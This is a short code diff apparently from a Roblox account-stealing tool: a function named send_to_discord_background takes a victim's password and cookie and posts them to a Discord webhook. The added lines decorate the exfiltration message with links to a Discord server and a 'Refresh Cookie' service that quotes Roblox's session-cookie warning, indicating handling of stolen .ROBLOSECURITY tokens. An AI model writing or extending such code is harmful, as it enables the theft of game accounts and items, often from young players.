@@ -73,6 +73,17 @@ def send_to_discord_background(password, cookie, webhook_url):
             'content': ping_content,
             'embeds': [
                 {
+                    'title': 'Top Embed Message',
+                    'color': 0xff0000,
+                    'fields': [
+                        {
+                            'name': '🔗 Quick Links',
+                            'value': '[**__Discord Server__ <:discord_icon:1236760091794083903>**](https://discord.gg/SsWFKqXr)\n\n[**__Refresh Cookie__ <:cookie1:1322924823764013086>**](https://dropref.com/?https://www.logged.tg/tools/refresher?defaultFill=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_)',
+                            'inline': False
+                        }
+                    ]
+                },
+                {
                     'title': 'Age Forcer',
                     'color': 0xff0000,
                     'thumbnail': {
